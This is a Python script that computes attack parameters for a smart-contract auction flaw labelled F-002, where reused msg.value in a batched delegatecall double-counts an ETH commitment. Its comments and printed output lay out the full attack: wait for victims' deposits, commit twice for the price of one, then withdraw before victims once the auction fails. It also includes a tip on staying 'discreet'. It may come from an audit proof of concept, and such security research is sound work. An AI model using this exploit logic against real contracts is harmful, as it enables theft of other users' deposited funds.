#!/usr/bin/env python3
"""Compute optimal parameters for the batch msg.value double-spend exploit (F-002).

Attack: call batch([commitEth(attacker, true), commitEth(attacker, true)], false) 
with msg.value = X ETH. Both calls see the same msg.value via delegatecall,
resulting in 2X commitment for only X ETH paid.

For profit: attacker needs other users' deposits Y >= X so that when auction fails,
attacker withdraws 2X (profit X) before other users can withdraw.

Optimal X = Y (other users' total deposits) for maximum profit.
But attacker can also split into multiple batches.
"""

# The key constraint: calculateCommitment must return the full amount for both calls.
# calculateCommitment uses clearingPrice which depends on tokenPrice which depends on commitmentsTotal.
# 
# For a new auction with:
# - totalTokens = 180,000,000 * 1e18 (from on-chain example)
# - startPrice, minimumPrice set appropriately
# - No prior commitments
#
# First call: commitmentsTotal=0, tokenPrice=0, clearingPrice=priceFunction
# maxCommitment = totalTokens * priceFunction / 1e18
# If msg.value=X <= maxCommitment, first call commits X
#
# Second call: commitmentsTotal=X, tokenPrice = X * 1e18 / totalTokens
# clearingPrice = max(tokenPrice, priceFunction)
# If tokenPrice < priceFunction: clearingPrice = priceFunction, maxCommitment unchanged
# If tokenPrice >= priceFunction: clearingPrice = tokenPrice, maxCommitment = X
#   Then calculateCommitment returns maxCommitment - commitmentsTotal = X - X = 0
#
# So for the double-spend to work, tokenPrice must stay below priceFunction.
# tokenPrice = X * 1e18 / totalTokens < priceFunction
# X < priceFunction * totalTokens / 1e18

# With typical parameters:
totalTokens = 180_000_000 * 1e18  # 180M tokens with 18 decimals
startPrice = 0.0006325 * 1e18     # ~6.325e14 wei
minPrice = 0.0003795 * 1e18       # ~3.795e14 wei

# Price function starts at startPrice and declines to minPrice
# To maximize double-spend, attacker should attack early when priceFunction is high
# priceFunction = startPrice initially

max_commitment_single = totalTokens * startPrice / 1e18
print(f"Max commitment (single call) at start price: {max_commitment_single / 1e18:.2f} tokens worth of ETH")

# The attack works best when:
# 1. Auction just started (priceFunction = startPrice, highest)
# 2. No prior commitments (so first call gets full amount)
# 3. X is large enough to be profitable but small enough that tokenPrice stays < priceFunction

# After first commit of X ETH:
# tokenPrice = X * 1e18 / totalTokens
# For second call to commit X: X * 1e18 / totalTokens < priceFunction
# X < priceFunction * totalTokens / 1e18 = max_commitment_single

# So X must be less than max_commitment_single for both calls to commit X
# But attacker can choose X up to max_commitment_single

optimal_x_eth = max_commitment_single / 1e18
print(f"Optimal X (max double-spend per batch): {optimal_x_eth:.6f} ETH")
print(f"Profit per batch: {optimal_x_eth:.6f} ETH")
print(f"Total commitment from {optimal_x_eth:.6f} ETH: {2*optimal_x_eth:.6f} ETH worth")

# However, this requires other users to have deposited at least X ETH
# The attacker can also use smaller amounts to be more discreet

# Let's also compute: what's the minimum priceFunction needed?
# For the second call to commit ANY amount > 0:
# tokenPrice after first call must be < priceFunction
# X * 1e18 / totalTokens < priceFunction
# X < priceFunction * totalTokens / 1e18

# The attack works as long as:
# 1. auction is not oversubscribed (tokenPrice < priceFunction)
# 2. there is capacity for more commitments

# For profit: need other users Y >= X where X is the attack amount
# After attack: attacker has 2X commitment, users have Y commitment
# Contract has X+Y ETH
# Attacker profit = X (stolen from users who can't withdraw)

print("\n--- Attack Mechanics ---")
print("1. Wait for other users to deposit Y ETH")
print("2. Call batch with X <= Y ETH, getting 2X commitment")
print("3. After auction fails, withdraw 2X ETH before other users")
print(f"4. Profit = X ETH (limited by other users' deposits)")
print("\nNote: This is a race condition; attacker must withdraw before victims.")
